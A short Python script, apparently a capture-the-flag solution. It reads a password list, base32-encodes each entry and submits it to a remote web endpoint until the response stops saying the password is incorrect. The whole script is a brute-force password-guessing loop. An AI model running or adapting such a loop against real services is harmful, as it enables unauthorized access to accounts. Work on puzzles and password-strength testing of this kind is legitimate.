import urllib.request
import base64

P = open("pass.txt")

count = 1

for p in P.readlines():

    password = base64.b32encode(p.strip().encode())

    response = urllib.request.urlopen('https://wm01.allyourbases.co/?pass='+password.decode())
    html = response.read().decode()

    if html != "Error: password incorrect":
        print(html)
        exit()
    else:
        print(count,end=" ")

    if count%25==0:
        print("\n",end="")

    count+=1